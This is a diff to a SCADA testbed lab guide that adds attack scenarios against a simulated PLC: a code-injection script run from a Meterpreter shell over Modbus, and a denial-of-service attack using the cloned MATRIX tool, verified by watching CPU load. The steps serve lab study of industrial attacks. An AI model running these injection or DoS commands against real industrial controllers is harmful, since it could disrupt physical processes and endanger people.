@@ -8,6 +8,12 @@ At this level, we consider you've installed the original testbed network (i.e fr
 
 Docker Containers
 
+```
+docker ps 
+```
+
+Displays the list of containers, 
+
 **ScadaBR**
    - **Role:** Simulates a HMI and Historian in the Scada Network.
    - **Network:**
@@ -65,7 +71,6 @@ Docker container
 
 **Attacker**
    - **Role:** Simulates the attacker in the Scada network.
-   - **Image:** `kalilinux/kali-rolling`
    - **Networks:**
      - `Name` (Swat)
      - `network2` (IP: 172.18.0.18)
@@ -179,4 +184,52 @@ Meterpreter terminal
 shell
 python3 code-injection.py -t 172.18.0.11 -p 502
 ```
+
+![Screenshot](images/code-injection/1.png)
+
+Results on the open plc dashboard
+
+![Screenshot](images/code-injection/2.png)
+
+
+## *Scenario - 3 : DDOS attack in plc*
+
+In this scenario, the attacker's aim is to make the plc unaccessible. The HMI and the MTU won't be able to access the PLC anymore
+
+### The DDOS script developped by Matrix
+
+Attacker terminal
+```
+# Clone the repository
+git clone https://github.com/SpiderLabs/MATRIX.git
+cd matrix
+python3 -m venv venv
+source venv/bin/activate 
+pip3 install -r requirements.txt
+apt-get install libpcap-dev
+```
+
+- Run the DOS command from the attacker's machine, the attacker doesn't need to be in the target's machine: 
+
+```
+python matrix.py -H 172.18.0.11 -p 502 -a dos -t 1000
+```
+
+- When the attack is lauched, you could verify by getting to the plc's terminal, it is preferable to open a terminal for plc before the attack
+
+bash
+```
+docker exec -it plc11 bash
+```
+
+plc11 terminal
+```
+# Install htop to verify cpu metrics
+apt install htop
+htop
+```
+
+CPU overwhelmed after attack: 
+
+![Screenshot](images/db//3.png)
 
